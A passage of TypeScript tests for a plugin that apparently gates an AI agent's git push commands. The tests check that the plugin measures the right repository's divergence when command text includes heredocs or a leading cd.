				remoteTip: measureGitPushProvenance("git push origin main", target)?.remoteTip,
				localTip: measureGitPushProvenance("git push origin main", target)?.localTip,
				ahead: 1,
				behind: 1,
				forwardOnly: false,
			});
			// A directory the command's text does not pin measures nothing.
			expect(measureGitPushProvenance('cd "$REPO" && git push origin main', session)).toBeUndefined();
		} finally {
			for (const dir of [session, target]) execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});
	test("a heredoc push word does not steer the executable push repository", async () => {
		const session = mkdtempSync(join(tmpdir(), "jev63-heredoc-session-"));
		const repoB = mkdtempSync(join(tmpdir(), "jev63-heredoc-b-"));
		const repoC = mkdtempSync(join(tmpdir(), "jev63-heredoc-c-"));
		try {
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && git update-ref refs/remotes/origin/main HEAD && git commit -q --allow-empty -m local", repoB);
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && git checkout -q --detach HEAD && git commit -q --allow-empty -m remote-only && git update-ref refs/remotes/origin/main HEAD && git checkout -q main && git commit -q --allow-empty -m local-only", repoC);
			const command = `echo "漢字"; cd ${repoB}; cat <<'EOF'\ngit push origin main\nEOF\ncd ${repoC}; git push origin main`;
			expect(measureGitPushProvenance(command, session)).toMatchObject({ ahead: 1, behind: 1, forwardOnly: false });
			await loadPlugin(makeSettings([]));
			setJevAnswer(jevSafeAnswer());
			await fire("tool_call", makeEvent(command), makeCtx({ sessionId: "prov-heredoc-offset", cwd: session }));
			expect(stateOf(0).gitPushProvenance).toMatchObject({ ahead: 1, behind: 1, forwardOnly: false });
		} finally {
			for (const dir of [session, repoB, repoC]) execSync(`trash ${JSON.stringify(dir)} 2>/dev/null || rm -rf ${JSON.stringify(dir)}`);
		}
	});
});

// Round 4 review, as the caller half of the same class: the handler resolves a
// leading `cd X &&` into the directory the host runs the command in, and then
// handed the provenance measurements that RESOLVED directory together with the
// command text that still contains the `cd`. The walkers apply the command's
// own `cd` chain, so the extracted `cd` was applied twice and the repository
// measured was the one one directory too deep. Every caller measures from the
// directory the command's text STARTS in, which is the pairing the script-body
// reader has always taken (#67 round 1).
describe("the gate measures the push in the directory the shell runs in (#63 round 4)", () => {
	let seq = 0;
	beforeEach(async () => {
		removeConfigFile();
		await loadPlugin(makeSettings([]));
		setJevAnswer(jevSafeAnswer());
	});

	test("a leading cd is not applied twice to the measured repository", async () => {
		const session = mkdtempSync(join(tmpdir(), "jev63-caller-"));
		const child = join(session, "child");
		mkdirSync(join(child, "child"), { recursive: true });
		try {
			// Three repositories. The session's own is a clean fast-forward; the
			// one the command's `cd` reaches has DIVERGED, so the push discards a
			// remote commit; and the one a second application of that `cd` lands
			// in is another clean fast-forward — so the mistaken measurement is
			// defined and reassuring rather than absent. An absent measurement
			// would already be the safe answer; a wrong one that reads as
			// reassurance is the outcome this test exists to catch.
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && git update-ref refs/remotes/origin/main HEAD && git commit -q --allow-empty -m local", session);
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && git checkout -q --detach HEAD && git commit -q --allow-empty -m remote-only && git update-ref refs/remotes/origin/main HEAD && git checkout -q main && git commit -q --allow-empty -m local-only", child);
			git("git init -q -b main && git remote add origin https://example.invalid/repo.git && git commit -q --allow-empty -m base && git update-ref refs/remotes/origin/main HEAD && git commit -q --allow-empty -m local", join(child, "child"));
			seq += 1;
			await fire("tool_call", makeEvent("cd child && git push origin main"), makeCtx({ sessionId: `prov-caller-${seq}`, cwd: session }));
			expect(stateOf(0).gitPushProvenance).toMatchObject({ ahead: 1, behind: 1, forwardOnly: false });
		} finally {
			execSync(`trash ${JSON.stringify(session)} 2>/dev/null || rm -rf ${JSON.stringify(session)}`);
		}
	});
});
